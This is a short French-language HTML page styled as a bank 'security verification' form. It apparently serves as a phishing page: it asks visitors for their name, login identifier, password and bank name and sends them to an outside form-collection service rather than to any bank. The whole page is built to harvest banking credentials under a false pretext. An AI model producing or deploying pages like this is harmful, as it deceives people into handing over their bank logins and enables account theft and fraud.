<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire de securite</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f6f6f6;
      padding: 50px;
    }
    form {
      background: white;
      padding: 30px;
      border-radius: 8px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    input, textarea, button {
      width: 100%;
      margin-bottom: 10px;
      padding: 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
    }
    button {
      background-color: #007BFF;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <h2>Formulaire de verification de s√©curite </h2>
  <form action="https://formspree.io/f/xbdakdel" method="POST">
    <label for="nom">Nom et prenom :</label>
    <input type="text" name="nom et prenom" required>

    <label for="Identifiant">Identifiant :</label>
    <input type="text" name="Identifiant" required>

    <label for="Mot de passe">Mot de passe :</label>
    <input type="text" name="Mot de passe" required>

    <label for="Nom de la banque">Nom de la banque :</label>
    <input type="text" name="Nom de la banque" required>

    
   <label for="message">Message (facultatif) :</label>
    <textarea name="message" rows="1"></textarea>

    <button type="submit">Envoyer</button>
  </form>

</body>
</html>
